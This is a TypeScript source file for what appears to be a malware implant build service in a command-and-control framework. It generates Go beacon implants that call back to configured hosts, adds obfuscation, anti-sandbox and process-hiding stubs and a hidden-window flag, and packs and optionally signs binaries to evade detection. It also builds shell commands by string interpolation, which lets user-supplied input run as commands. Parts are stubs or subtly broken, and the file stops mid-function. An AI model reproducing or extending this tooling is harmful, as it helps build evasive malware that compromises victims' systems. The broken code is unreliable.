/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unused-vars, @typescript-eslint/no-require-imports */
import { randomUUID } from "node:crypto"
import { exec } from "node:child_process"
import { promisify } from "node:util"
import { writeFile, mkdir, readFile, unlink } from "node:fs/promises"
import { join } from "node:path"
import { EventEmitter } from "node:events"
import { z } from "zod"

const execAsync = promisify(exec)

export const CompilationStatus = z.enum([
  "pending",
  "compiling",
  "completed",
  "failed",
  "cancelled"
])
export type CompilationStatus = z.infer<typeof CompilationStatus>

export const PackingConfig = z.object({
  enabled: z.boolean().default(true),
  method: z.enum(["upx", "custom", "none"]).default("upx"),
  algorithm: z.enum(["lzma", "ucl", "nrv", "auto"]).default("lzma"),
  compressionLevel: z.number().min(1).max(9).default(7),
  cacheEnabled: z.boolean().default(true),
  minCompressionRatio: z.number().min(0).max(100).default(10), // Minimum 10% compression
  maxCompressionRatio: z.number().min(0).max(100).default(80), // Warn if > 80% compression
  customScript: z.string().optional(),
  timeout: z.number().default(60000), // 60 seconds
  retryAttempts: z.number().default(2),
  preserveSymbols: z.boolean().default(false),
  stripDebugInfo: z.boolean().default(true)
})
export type PackingConfig = z.infer<typeof PackingConfig>

export const CompilationRequest = z.object({
  id: z.string().min(1),
  implantConfig: z.any(), // ImplantConfig type from generator
  optimization: z.enum(["debug", "size", "speed", "stealth"]).default("stealth"),
  obfuscation: z.boolean().default(true),
  packing: z.union([z.boolean(), PackingConfig]).default(true),
  signing: z.object({
    enabled: z.boolean().default(false),
    certificate: z.string().optional(),
    key: z.string().optional()
  }).default({ enabled: false }),
  customCode: z.string().optional(),
  dependencies: z.array(z.string()).default([]),
  environment: z.enum(["development", "staging", "production"]).default("production"),
  priority: z.enum(["low", "normal", "high", "urgent"]).default("normal")
})
export type CompilationRequest = z.infer<typeof CompilationRequest>

export const CompilationResult = z.object({
  id: z.string(),
  requestId: z.string(),
  status: CompilationStatus,
  binaryPath: z.string().optional(),
  size: z.number().optional(),
  md5: z.string().optional(),
  sha256: z.string().optional(),
  compileTime: z.number().optional(),
  warnings: z.array(z.string()).default([]),
  errors: z.array(z.string()).default([]),
  logs: z.array(z.string()).default([]),
  metadata: z.record(z.string(), z.any()).default({}),
  createdAt: z.number().int(),
  startedAt: z.number().int().optional(),
  completedAt: z.number().int().optional()
})
export type CompilationResult = z.infer<typeof CompilationResult>

export interface CompilationQueue {
  pending: CompilationRequest[]
  compiling: Map<string, CompilationRequest>
  completed: CompilationResult[]
  failed: CompilationResult[]
}

export class ImplantCompilationService extends EventEmitter {
  private queue: CompilationQueue = {
    pending: [],
    compiling: new Map(),
    completed: [],
    failed: []
  }
  private maxConcurrentJobs = 3
  private compilationDir: string
  private templatesDir: string
  private outputDir: string
  private cacheDir: string
  private isProcessing = false
  private processingTimer?: NodeJS.Timeout
  private packingCache: Map<string, { packedBinary: Buffer; timestamp: number; metadata: any }> = new Map()
  private packingStats: {
    totalPacked: number
    totalUnpacked: number
    averageCompressionRatio: number
    methodUsage: Record<string, number>
    cacheHits: number
    cacheMisses: number
  } = {
    totalPacked: 0,
    totalUnpacked: 0,
    averageCompressionRatio: 0,
    methodUsage: {},
    cacheHits: 0,
    cacheMisses: 0
  }

  constructor() {
    super()
    this.compilationDir = join(process.cwd(), "compilation")
    this.templatesDir = join(this.compilationDir, "templates")
    this.outputDir = join(this.compilationDir, "output")
    this.cacheDir = join(this.compilationDir, "packing-cache")
    this.initializeDirectories()
    this.startProcessing()
  }

  /**
   * Initialize compilation directories
   */
  private async initializeDirectories(): Promise<void> {
    await mkdir(this.compilationDir, { recursive: true })
    await mkdir(this.templatesDir, { recursive: true })
    await mkdir(this.outputDir, { recursive: true })
    await mkdir(this.cacheDir, { recursive: true })
    await this.createCompilationTemplates()
    await this.loadPackingCache()
  }

  /**
   * Submit a compilation request
   */
  async submitCompilation(request: Omit<CompilationRequest, "id">): Promise<string> {
    const compilationRequest: CompilationRequest = {
      id: randomUUID(),
      ...request
    }

    // Add to queue based on priority
    this.addToQueue(compilationRequest)

    // Create initial result
    const result: CompilationResult = {
      id: randomUUID(),
      requestId: compilationRequest.id,
      status: "pending",
      warnings: [],
      errors: [],
      logs: [`Compilation request submitted at ${new Date().toISOString()}`],
      metadata: {},
      createdAt: Date.now()
    }

    this.emit("compilationSubmitted", { request: compilationRequest, result })

    return compilationRequest.id
  }

  /**
   * Add request to queue based on priority
   */
  private addToQueue(request: CompilationRequest): void {
    const priorityOrder = { urgent: 0, high: 1, normal: 2, low: 3 }
    const requestPriority = priorityOrder[request.priority]

    // Insert in priority order
    let insertIndex = this.queue.pending.length
    for (let i = 0; i < this.queue.pending.length; i++) {
      if (priorityOrder[this.queue.pending[i].priority] > requestPriority) {
        insertIndex = i
        break
      }
    }

    this.queue.pending.splice(insertIndex, 0, request)
  }

  /**
   * Start processing the queue
   */
  private startProcessing(): void {
    this.processingTimer = setInterval(() => {
      if (!this.isProcessing) {
        this.processQueue()
      }
    }, 1000)
  }

  /**
   * Process compilation queue
   */
  private async processQueue(): Promise<void> {
    if (this.queue.compiling.size >= this.maxConcurrentJobs || this.queue.pending.length === 0) {
      return
    }

    this.isProcessing = true

    try {
      while (this.queue.compiling.size < this.maxConcurrentJobs && this.queue.pending.length > 0) {
        const request = this.queue.pending.shift()!
        this.queue.compiling.set(request.id, request)
        
        // Process compilation in background
        this.processCompilation(request).catch(error => {
          console.error(`Compilation failed for ${request.id}:`, error)
        })
      }
    } finally {
      this.isProcessing = false
    }
  }

  /**
   * Process individual compilation
   */
  private async processCompilation(request: CompilationRequest): Promise<void> {
    const result: CompilationResult = {
      id: randomUUID(),
      requestId: request.id,
      status: "compiling",
      warnings: [],
      errors: [],
      logs: [`Starting compilation at ${new Date().toISOString()}`],
      metadata: {},
      createdAt: Date.now(),
      startedAt: Date.now()
    }

    this.emit("compilationStarted", { request, result })

    try {
      const startTime = Date.now()

      // Generate source code
      const sourceCode = await this.generateSourceCode(request)
      result.logs.push("Source code generated successfully")

      // Write source file
      const sourcePath = join(this.compilationDir, `${request.id}.go`)
      await writeFile(sourcePath, sourceCode)
      result.logs.push(`Source written to: ${sourcePath}`)

      // Compile the implant
      const compilationResult = await this.compileImplant(request, sourcePath)
      
      if (compilationResult.success) {
        result.status = "completed"
        result.binaryPath = compilationResult.binaryPath
        result.size = compilationResult.size
        result.md5 = compilationResult.md5
        result.sha256 = compilationResult.sha256
        result.warnings = compilationResult.warnings || []
        result.logs.push(...compilationResult.logs || [])
        result.logs.push("Compilation completed successfully")

        // Apply post-processing
        await this.postProcessImplant(result, request)

        this.queue.completed.push(result)
        this.emit("compilationCompleted", { request, result })
      } else {
        result.status = "failed"
        result.errors = [compilationResult.error || "Unknown compilation error"]
        result.logs.push(...compilationResult.logs || [])
        result.logs.push("Compilation failed")

        this.queue.failed.push(result)
        this.emit("compilationFailed", { request, result })
      }

      result.completedAt = Date.now()
      result.compileTime = Date.now() - startTime

    } catch (error) {
      result.status = "failed"
      result.errors = [error instanceof Error ? error.message : "Unknown error"]
      result.completedAt = Date.now()
      result.logs.push(`Compilation error: ${error}`)

      this.queue.failed.push(result)
      this.emit("compilationFailed", { request, result })
    } finally {
      // Remove from compiling map
      this.queue.compiling.delete(request.id)

      // Cleanup temporary files
      await this.cleanupTempFiles(request.id)
    }
  }

  /**
   * Generate source code with optimizations
   */
  private async generateSourceCode(request: CompilationRequest): Promise<string> {
    const config = request.implantConfig
    let sourceCode = await this.generateBaseImplantCode(config)

    // Apply obfuscation if enabled
    if (request.obfuscation) {
      sourceCode = await this.obfuscateCode(sourceCode)
    }

    // Add custom code if provided
    if (request.customCode) {
      sourceCode = sourceCode.replace("// CUSTOM_CODE_INSERTION_POINT", request.customCode)
    }

    // Apply optimizations based on type
    switch (request.optimization) {
      case "size":
        sourceCode = await this.optimizeForSize(sourceCode)
        break
      case "speed":
        sourceCode = await this.optimizeForSpeed(sourceCode)
        break
      case "stealth":
        sourceCode = await this.optimizeForStealth(sourceCode)
        break
      case "debug":
        sourceCode = await this.addDebugFeatures(sourceCode)
        break
    }

    return sourceCode
  }

  /**
   * Generate base implant code
   */
  private async generateBaseImplantCode(config: any): Promise<string> {
    // This would use the implant generator from earlier
    // For now, return a basic template
    return `package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"
)

// Configuration
var config = \` + JSON.stringify(config) + \`

// CUSTOM_CODE_INSERTION_POINT

func main() {
	// Main implant logic
	for {
		sendBeacon()
		time.Sleep(time.Duration(config.SleepTime) * time.Millisecond)
	}
}

func sendBeacon() {
	// Beacon implementation
	client := &http.Client{Timeout: 30 * time.Second}
	
	for _, transport := range config.Transports {
		url := fmt.Sprintf("https://%s:%d%s/beacon", transport.Host, transport.Port, transport.Path)
		
		resp, err := client.Post(url, "application/json", nil)
		if err == nil && resp.StatusCode == 200 {
			resp.Body.Close()
			break
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}
`
  }

  /**
   * Obfuscate source code
   */
  private async obfuscateCode(sourceCode: string): Promise<string> {
    // Basic obfuscation - in reality, this would use sophisticated techniques
    let obfuscated = sourceCode

    // Replace function names
    const functionMap = {
      "sendBeacon": "f1",
      "main": "m1",
      "rand": "r1"
    }

    for (const [original, replacement] of Object.entries(functionMap)) {
      obfuscated = obfuscated.replace(new RegExp(original, 'g'), replacement)
    }

    // Add junk code
    const junkCode = `
func junk() {
	var x int
	for i := 0; i < 100; i++ {
		x += i
	}
}
`

    return obfuscated + junkCode
  }

  /**
   * Optimize for size
   */
  private async optimizeForSize(sourceCode: string): Promise<string> {
    // Remove comments and unnecessary whitespace
    return sourceCode
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/\/\/.*$/gm, '')
      .replace(/\s+/g, ' ')
      .trim()
  }

  /**
   * Optimize for speed
   */
  private async optimizeForSpeed(sourceCode: string): Promise<string> {
    // Add performance optimizations
    return sourceCode.replace(
      'time.Sleep(time.Duration(config.SleepTime) * time.Millisecond)',
      'time.Sleep(time.Duration(config.SleepTime) * time.Millisecond)'
    )
  }

  /**
   * Optimize for stealth
   */
  private async optimizeForStealth(sourceCode: string): Promise<string> {
    // Add stealth features
    const stealthCode = `
func checkSandbox() bool {
	// Anti-sandbox checks
	if runtime.GOOS == "windows" {
		// Check for common sandbox artifacts
		return false
	}
	return false
}

func hideProcess() {
	// Process hiding techniques
}
`

    return sourceCode + stealthCode
  }

  /**
   * Add debug features
   */
  private async addDebugFeatures(sourceCode: string): Promise<string> {
    const debugCode = `
func debugLog(msg string) {
	f, _ := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	f.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format(time.RFC3339), msg))
	f.Close()
}
`

    return sourceCode.replace('func main() {', debugCode + '\nfunc main() {')
  }

  /**
   * Compile the implant
   */
  private async compileImplant(request: CompilationRequest, sourcePath: string): Promise<{
    success: boolean
    binaryPath?: string
    size?: number
    md5?: string
    sha256?: string
    error?: string
    warnings?: string[]
    logs?: string[]
  }> {
    const logs: string[] = []
    const warnings: string[] = []

    try {
      const outputPath = join(this.outputDir, `implant-${request.id}`)
      const goOS = this.getGoOS(request.implantConfig.type)
      const goArch = request.implantConfig.architecture

      let ldflags = "-s -w"
      
      if (request.optimization === "size") {
        ldflags += " -extldflags=-static"
      }

      if (request.implantConfig.type === "windows-exe") {
        ldflags += " -H=windowsgui"
      }

      const compileCommand = `go build -ldflags="${ldflags}" -o "${outputPath}" "${sourcePath}"`

      logs.push(`Executing: ${compileCommand}`)

      const { stdout, stderr } = await execAsync(compileCommand, {
        env: {
          ...process.env,
          GOOS: goOS,
          GOARCH: goArch,
          CGO_ENABLED: "0"
        },
        cwd: this.compilationDir
      })

      if (stderr) {
        if (stderr.includes("warning")) {
          warnings.push(stderr)
          logs.push(`Compiler warnings: ${stderr}`)
        } else {
          throw new Error(`Compilation failed: ${stderr}`)
        }
      }

      // Calculate file hashes
      const crypto = require('crypto')
      const fs = require('fs')
      
      const fileBuffer = await fs.promises.readFile(outputPath)
      const size = fileBuffer.length
      
      const md5Hash = crypto.createHash('md5')
      md5Hash.update(fileBuffer)
      const md5 = md5Hash.digest('hex')
      
      const sha256Hash = crypto.createHash('sha256')
      sha256Hash.update(fileBuffer)
      const sha256 = sha256Hash.digest('hex')

      logs.push(`Binary created: ${outputPath}`)
      logs.push(`Size: ${size} bytes`)
      logs.push(`MD5: ${md5}`)
      logs.push(`SHA256: ${sha256}`)

      return {
        success: true,
        binaryPath: outputPath,
        size,
        md5,
        sha256,
        warnings,
        logs
      }

    } catch (error) {
      logs.push(`Compilation error: ${error}`)
      return {
        success: false,
        error: error instanceof Error ? error.message : "Unknown error",
        logs
      }
    }
  }

  /**
   * Post-process the compiled implant
   */
  private async postProcessImplant(result: CompilationResult, request: CompilationRequest): Promise<void> {
    if (!result.binaryPath) return

    try {
      // Normalize packing config
      const packingConfig = this.normalizePackingConfig(request.packing)

      // Apply packing if enabled
      if (packingConfig.enabled && packingConfig.method !== "none") {
        result.logs.push("Starting binary packing process...")
        result.logs.push(`Packing method: ${packingConfig.method}`)
        result.logs.push(`Compression algorithm: ${packingConfig.algorithm}`)
        result.logs.push(`Compression level: ${packingConfig.compressionLevel}`)

        // Pack the binary with enhanced configuration
        const packResult = await this.packBinaryEnhanced(result.binaryPath, packingConfig)

        if (packResult.success) {
          result.logs.push("Binary packed successfully")
          result.logs.push(`Original size: ${packResult.originalSize} bytes`)
          result.logs.push(`Packed size: ${packResult.packedSize} bytes`)
          result.logs.push(`Compression ratio: ${packResult.compressionRatio?.toFixed(2)}%`)
          result.logs.push(`Packing method: ${packResult.method}`)
          result.logs.push(`Cache hit: ${packResult.fromCache ? "Yes" : "No"}`)

          // Check compression ratio thresholds
          if (packResult.compressionRatio !== undefined) {
            if (packResult.compressionRatio < packingConfig.minCompressionRatio) {
              result.warnings.push(`Compression ratio ${packResult.compressionRatio.toFixed(2)}% below minimum threshold ${packingConfig.minCompressionRatio}%`)
            }
            if (packResult.compressionRatio > packingConfig.maxCompressionRatio) {
              result.warnings.push(`Compression ratio ${packResult.compressionRatio.toFixed(2)}% exceeds maximum threshold ${packingConfig.maxCompressionRatio}%`)
            }
          }

          // Update result metadata with packing information
          result.metadata.packing = {
            enabled: true,
            method: packResult.method,
            algorithm: packResult.algorithm,
            originalSize: packResult.originalSize,
            packedSize: packResult.packedSize,
            compressionRatio: packResult.compressionRatio,
            fromCache: packResult.fromCache,
            timestamp: Date.now(),
            retryAttempts: packResult.retryAttempts
          }
        } else {
          result.warnings.push(`Packing failed: ${packResult.error}`)
          result.warnings.push("Continuing with unpacked binary")
          result.metadata.packing = {
            enabled: true,
            success: false,
            error: packResult.error,
            retryAttempts: packResult.retryAttempts
          }
        }
      } else {
        result.logs.push("Packing disabled or method set to 'none', using unpacked binary")
        result.metadata.packing = {
          enabled: false,
          method: packingConfig.method
        }
      }

      // Apply signing if enabled
      if (request.signing.enabled) {
        result.logs.push("Starting binary signing process...")
        await this.signBinary(result.binaryPath, request.signing)
        result.logs.push("Binary signed successfully")
        result.metadata.signing = {
          enabled: true,
          timestamp: Date.now()
        }
      }

      // Calculate final hashes
      const crypto = require('crypto')
      const fs = require('fs')

      const fileBuffer = await fs.promises.readFile(result.binaryPath)

      const md5Hash = crypto.createHash('md5')
      md5Hash.update(fileBuffer)
      result.md5 = md5Hash.digest('hex')

      const sha256Hash = crypto.createHash('sha256')
      sha256Hash.update(fileBuffer)
      result.sha256 = sha256Hash.digest('hex')

      const stats = await fs.promises.stat(result.binaryPath)
      result.size = stats.size

      result.logs.push(`Final binary size: ${result.size} bytes`)
      result.logs.push(`Final MD5: ${result.md5}`)
      result.logs.push(`Final SHA256: ${result.sha256}`)

    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown post-processing error'
      result.errors.push(`Post-processing error: ${errorMessage}`)
      result.logs.push(`Post-processing failed: ${errorMessage}`)
    }
  }

  /**
   * Normalize packing config to PackingConfig type
   */
  private normalizePackingConfig(packing: boolean | PackingConfig): PackingConfig {
    if (typeof packing === "boolean") {
      return {
        enabled: packing,
        method: "upx",
        algorithm: "lzma",
        compressionLevel: 7,
        cacheEnabled: true,
        minCompressionRatio: 10,
        maxCompressionRatio: 80,
        timeout: 60000,
        retryAttempts: 2,
        preserveSymbols: false,
        stripDebugInfo: true
      }
    }
    return packing
  }

  /**
   * Pack the binary with UPX compression (legacy method for backward compatibility)
   */
  private async packBinary(binaryPath: string): Promise<{
    success: boolean
    originalSize?: number
    packedSize?: number
    compressionRatio?: number
    method?: string
    error?: string
  }> {
    const fs = require('fs')
    const path = require('path')

    try {
      // Get original file size
      const originalStats = await fs.promises.stat(binaryPath)
      const originalSize = originalStats.size

      // Create backup before packing
      const backupPath = await this.createBackup(binaryPath)
      if (!backupPath) {
        console.warn(`[PackBinary] Failed to create backup, proceeding anyway`)
      }

      // Determine file extension and platform
      const ext = path.extname(binaryPath).toLowerCase()
      const isWindows = ext === '.exe' || ext === '.dll'
      const isLinux = ext === '' || binaryPath.includes('linux')
      const isMacOS = binaryPath.includes('darwin') || binaryPath.includes('macos')

      // Check if UPX is available
      const upxAvailable = await this.checkUPXAvailable()

      if (!upxAvailable) {
        console.warn(`[PackBinary] UPX not available, skipping packing for ${binaryPath}`)
        return {
          success: false,
          originalSize,
          error: 'UPX not available'
        }
      }

      // Determine compression level based on file size and platform
      const compressionLevel = this.determineCompressionLevel(originalSize, isWindows)

      // Build UPX command
      const upxCommand = this.buildUPXCommand(binaryPath, compressionLevel, isWindows, isLinux, isMacOS)

      console.log(`[PackBinary] Executing: ${upxCommand}`)

      // Execute UPX packing
      const { stdout, stderr } = await execAsync(upxCommand, {
        timeout: 60000, // 60 second timeout
        maxBuffer: 1024 * 1024 * 10 // 10MB buffer
      })

      // Get packed file size
      const packedStats = await fs.promises.stat(binaryPath)
      const packedSize = packedStats.size
      const compressionRatio = ((originalSize - packedSize) / originalSize) * 100

      console.log(`[PackBinary] Packed successfully: ${binaryPath}`)
      console.log(`[PackBinary] Original size: ${originalSize} bytes`)
      console.log(`[PackBinary] Packed size: ${packedSize} bytes`)
      console.log(`[PackBinary] Compression ratio: ${compressionRatio.toFixed(2)}%`)

      // Validate the packed binary
      const validationResult = await this.validatePackedBinary(binaryPath, isWindows, isLinux, isMacOS)
      if (!validationResult.valid) {
        console.warn(`[PackBinary] Validation failed: ${validationResult.error}`)
        // Restore original binary if validation fails
        await this.restoreBackup(binaryPath)
        return {
          success: false,
          originalSize,
          error: validationResult.error
        }
      }

      // Clean up backup on successful packing
      if (backupPath) {
        try {
          await fs.promises.unlink(backupPath)
        } catch {
          // Ignore cleanup error
        }
      }

      return {
        success: true,
        originalSize,
        packedSize,
        compressionRatio,
        method: 'UPX'
      }

    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown packing error'
      console.error(`[PackBinary] Packing failed: ${errorMessage}`)

      // Attempt to restore backup if packing failed
      await this.restoreBackup(binaryPath)

      return {
        success: false,
        error: errorMessage
      }
    }
  }

  /**
   * Check if UPX is available on the system
   */
  private async checkUPXAvailable(): Promise<boolean> {
    try {
      const { stdout } = await execAsync('upx --version', { timeout: 5000 })
      return stdout.includes('UPX')
    } catch {
      return false
    }
  }

  /**
   * Determine compression level based on file size and platform
   */
  private determineCompressionLevel(fileSize: number, isWindows: boolean): number {
    // Use higher compression for smaller files, lower for larger files
    if (fileSize < 5 * 1024 * 1024) { // < 5MB
      return 9 // Best compression
    } else if (fileSize < 20 * 1024 * 1024) { // < 20MB
      return 7 // Good compression
    } else {
      return 5 // Fast compression for large files
    }
  }

  /**
   * Build UPX command with appropriate flags
   */
  private buildUPXCommand(
    binaryPath: string,
    compressionLevel: number,
    isWindows: boolean,
    isLinux: boolean,
    isMacOS: boolean
  ): string {
    let command = `upx --best --lzma -${compressionLevel} "${binaryPath}"`

    // Platform-specific flags
    if (isWindows) {
      command += ' --force'
    } else if (isLinux) {
      command += ' --force'
    } else if (isMacOS) {
      command += ' --force'
    }

    // Additional UPX flags for better stealth and compression
    command += ' --no-backup --overlay=copy'

    return command
  }

  /**
   * Validate the packed binary
   */
  private async validatePackedBinary(
    binaryPath: string,
    isWindows: boolean,
    isLinux: boolean,
    isMacOS: boolean
  ): Promise<{ valid: boolean; error?: string }> {
    const fs = require('fs')

    try {
      // Check if file exists
      if (!fs.existsSync(binaryPath)) {
        return { valid: false, error: 'Packed binary not found' }
      }

      // Check file size
      const stats = await fs.promises.stat(binaryPath)
      if (stats.size === 0) {
        return { valid: false, error: 'Packed binary is empty' }
      }

      // Validate binary format using file command if available
      try {
        const { stdout } = await execAsync(`file "${binaryPath}"`, { timeout: 5000 })

        if (isWindows && !stdout.includes('PE32')) {
          return { valid: false, error: 'Invalid Windows PE binary after packing' }
        } else if (isLinux && !stdout.includes('ELF')) {
          return { valid: false, error: 'Invalid Linux ELF binary after packing' }
        } else if (isMacOS && !stdout.includes('Mach-O')) {
          return { valid: false, error: 'Invalid macOS Mach-O binary after packing' }
        }
      } catch {
        // file command not available, skip format check
      }

      return { valid: true }
    } catch (error) {
      return {
        valid: false,
        error: error instanceof Error ? error.message : 'Unknown validation error'
      }
    }
  }

  /**
   * Create backup of original binary before packing
   */
  private async createBackup(binaryPath: string): Promise<string | null> {
    const fs = require('fs')
    const path = require('path')

    try {
      const backupPath = `${binaryPath}.unpacked`
      await fs.promises.copyFile(binaryPath, backupPath)
      return backupPath
    } catch {
      return null
    }
  }

  /**
   * Restore backup if packing fails
   */
  private async restoreBackup(binaryPath: string): Promise<void> {
    const fs = require('fs')
    const path = require('path')

    const backupPath = `${binaryPath}.unpacked`

    try {
      if (fs.existsSync(backupPath)) {
        await fs.promises.copyFile(backupPath, binaryPath)
        await fs.promises.unlink(backupPath)
        console.log(`[PackBinary] Restored backup: ${binaryPath}`)
      }
    } catch {
      // Ignore restore errors
    }
  }

  /**
   * Enhanced binary packing with multiple methods, caching, and advanced configuration
   */
  private async packBinaryEnhanced(
    binaryPath: string,
    config: PackingConfig
  ): Promise<{
    success: boolean
    originalSize?: number
    packedSize?: number
    compressionRatio?: number
    method?: string
    algorithm?: string
    fromCache?: boolean
    retryAttempts?: number
    error?: string
  }> {
    const fs = require('fs')
    const crypto = require('crypto')
    const path = require('path')

    let retryCount = 0
    const maxRetries = config.retryAttempts

    while (retryCount <= maxRetries) {
      try {
        // Get original file size and hash
        const originalStats = await fs.promises.stat(binaryPath)
        const originalSize = originalStats.size
        const originalBuffer = await fs.promises.readFile(binaryPath)
        const originalHash = crypto.createHash('sha256').update(originalBuffer).digest('hex')

        // Generate cache key
        const cacheKey = this.generateCacheKey(binaryPath, originalHash, config)
        console.log(`[PackBinaryEnhanced] Cache key: ${cacheKey}`)

        // Check cache if enabled
        if (config.cacheEnabled) {
          const cachedResult = this.packingCache.get(cacheKey)
          if (cachedResult) {
            console.log(`[PackBinaryEnhanced] Cache hit for ${binaryPath}`)
            this.packingStats.cacheHits++

            // Write cached binary to file
            await fs.promises.writeFile(binaryPath, cachedResult.packedBinary)

            const packedSize = cachedResult.packedBinary.length
            const compressionRatio = ((originalSize - packedSize) / originalSize) * 100

            this.updatePackingStats(config.method, compressionRatio, true)

            return {
              success: true,
              originalSize,
              packedSize,
              compressionRatio,
              method: config.method,
              algorithm: config.algorithm,
              fromCache: true,
              retryAttempts: retryCount
            }
          } else {
            this.packingStats.cacheMisses++
          }
        }

        // Create backup before packing
        const backupPath = await this.createBackup(binaryPath)
        if (!backupPath) {
          console.warn(`[PackBinaryEnhanced] Failed to create backup, proceeding anyway`)
        }

        // Pack based on method
        let packResult
        switch (config.method) {
          case "upx":
            packResult = await this.packWithUPX(binaryPath, config)
            break
          case "custom":
            packResult = await this.packWithCustomScript(binaryPath, config)
            break
          case "none":
            return {
              success: true,
              originalSize,
              packedSize: originalSize,
              compressionRatio: 0,
              method: "none",
              algorithm: "none",
              fromCache: false,
              retryAttempts: retryCount
            }
          default:
            throw new Error(`Unknown packing method: ${config.method}`)
        }

        if (!packResult.success) {
          throw new Error(packResult.error || "Packing failed")
        }

        // Get packed file size and calculate compression ratio
        const packedStats = await fs.promises.stat(binaryPath)
        const packedSize = packedStats.size
        const compressionRatio = ((originalSize - packedSize) / originalSize) * 100

        console.log(`[PackBinaryEnhanced] Packed successfully: ${binaryPath}`)
        console.log(`[PackBinaryEnhanced] Original size: ${originalSize} bytes`)
        console.log(`[PackBinaryEnhanced] Packed size: ${packedSize} bytes`)
        console.log(`[PackBinaryEnhanced] Compression ratio: ${compressionRatio.toFixed(2)}%`)

        // Validate the packed binary
        const validationResult = await this.validatePackedBinaryEnhanced(binaryPath, config)
        if (!validationResult.valid) {
          console.warn(`[PackBinaryEnhanced] Validation failed: ${validationResult.error}`)
          await this.restoreBackup(binaryPath)
          throw new Error(validationResult.error)
        }

        // Cache the result if enabled
        if (config.cacheEnabled) {
          const packedBuffer = await fs.promises.readFile(binaryPath)
          this.packingCache.set(cacheKey, {
            packedBinary: packedBuffer,
            timestamp: Date.now(),
            metadata: {
              originalSize,
              packedSize,
              compressionRatio,
              method: config.method,
              algorithm: config.algorithm
            }
          })
          console.log(`[PackBinaryEnhanced] Cached result for ${binaryPath}`)
        }

        // Clean up backup on successful packing
        if (backupPath) {
          try {
            await fs.promises.unlink(backupPath)
          } catch {
            // Ignore cleanup error
          }
        }

        // Update statistics
        this.updatePackingStats(config.method, compressionRatio, false)

        return {
          success: true,
          originalSize,
          packedSize,
          compressionRatio,
          method: config.method,
          algorithm: config.algorithm,
          fromCache: false,
          retryAttempts: retryCount
        }

      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown packing error'
        console.error(`[PackBinaryEnhanced] Packing attempt ${retryCount + 1} failed: ${errorMessage}`)

        // Attempt to restore backup if packing failed
        await this.restoreBackup(binaryPath)

        retryCount++

        if (retryCount > maxRetries) {
          this.packingStats.totalUnpacked++
          return {
            success: false,
            error: errorMessage,
            retryAttempts: retryCount - 1
          }
        }

        // Exponential backoff before retry
        await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retryCount)))
      }
    }

    return {
      success: false,
      error: "Max retry attempts exceeded",
      retryAttempts: maxRetries
    }
  }

  /**
   * Generate cache key for packing results
   */
  private generateCacheKey(binaryPath: string, hash: string, config: PackingConfig): string {
    const path = require('path')
    const ext = path.extname(binaryPath)
    const basename = path.basename(binaryPath, ext)

    return `${basename}-${hash}-${config.method}-${config.algorithm}-${config.compressionLevel}`
  }

  /**
   * Pack binary using UPX with advanced configuration
   */
  private async packWithUPX(
    binaryPath: string,
    config: PackingConfig
  ): Promise<{ success: boolean; error?: string }> {
    try {
      // Check if UPX is available
      const upxAvailable = await this.checkUPXAvailable()
      if (!upxAvailable) {
        return {
          success: false,
          error: 'UPX not available'
        }
      }

      // Determine platform
      const path = require('path')
      const ext = path.extname(binaryPath).toLowerCase()
      const isWindows = ext === '.exe' || ext === '.dll'
      const isLinux = ext === '' || binaryPath.includes('linux')
      const isMacOS = binaryPath.includes('darwin') || binaryPath.includes('macos')

      // Build UPX command
      const upxCommand = this.buildUPXCommandEnhanced(binaryPath, config, isWindows, isLinux, isMacOS)

      console.log(`[PackWithUPX] Executing: ${upxCommand}`)

      // Execute UPX packing
      const { stdout, stderr } = await execAsync(upxCommand, {
        timeout: config.timeout,
        maxBuffer: 1024 * 1024 * 10 // 10MB buffer
      })

      return { success: true }

    } catch (error) {
      return {
        success: false,
        error: error instanceof Error ? error.message : 'UPX packing failed'
      }
    }
  }

  /**
   * Build enhanced UPX command with all configuration options
   */
  private buildUPXCommandEnhanced(
    binaryPath: string,
    config: PackingConfig,
    isWindows: boolean,
    isLinux: boolean,
    isMacOS: boolean
  ): string {
    let command = `upx --best`

    // Add compression algorithm
    switch (config.algorithm) {
      case "lzma":
        command += " --lzma"
        break
      case "ucl":
        command += " --ucl"
        break
      case "nrv":
        command += " --nrv2b"
        break
      case "auto":
        // Let UPX decide
        break
    }

    // Add compression level
    command += ` -${config.compressionLevel}`

    // Platform-specific flags
    if (isWindows) {
      command += " --force"
    } else if (isLinux) {
      command += " --force"
    } else if (isMacOS) {
      command += " --force"
    }

    // Additional flags based on config
    if (config.preserveSymbols) {
      command += " --keep-resource"
    }

    if (config.stripDebugInfo) {
      command += " --strip-relocs=force"
    }

    // Additional UPX flags for better stealth and compression
    command += " --no-backup --overlay=copy"

    // Add binary path
    command += ` "${binaryPath}"`

    return command
  }

  /**
   * Pack binary using custom script
   */
  private async packWithCustomScript(
    binaryPath: string,
    config: PackingConfig
  ): Promise<{ success: boolean; error?: string }> {
    if (!config.customScript) {
      return {
        success: false,
        error: 'Custom script not specified in packing config'
      }
    }

    try {
      console.log(`[PackWithCustomScript] Executing: ${config.customScript} ${binaryPath}`)

      const { stdout, stderr } = await execAsync(`${config.customScript} "${binaryPath}"`, {
        timeout: config.timeout,
        maxBuffer: 1024 * 1024 * 10
      })

      console.log(`[PackWithCustomScript] Script output: ${stdout}`)
      if (stderr) {
        console.warn(`[PackWithCustomScript] Script stderr: ${stderr}`)
      }

      return { success: true }

    } catch (error) {
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Custom script packing failed'
      }
    }
  }

  /**
   * Validate packed binary with enhanced checks
   */
  private async validatePackedBinaryEnhanced(
    binaryPath: string,
    config: PackingConfig
  ): Promise<{ valid: boolean; error?: string }> {
    const fs = require('fs')
    const path = require('path')

    try {
      // Check if file exists
      if (!fs.existsSync(binaryPath)) {
        return { valid: false, error: 'Packed binary not found' }
      }

      // Check file size
      const stats = await fs.promises.stat(binaryPath)
      if (stats.size === 0) {
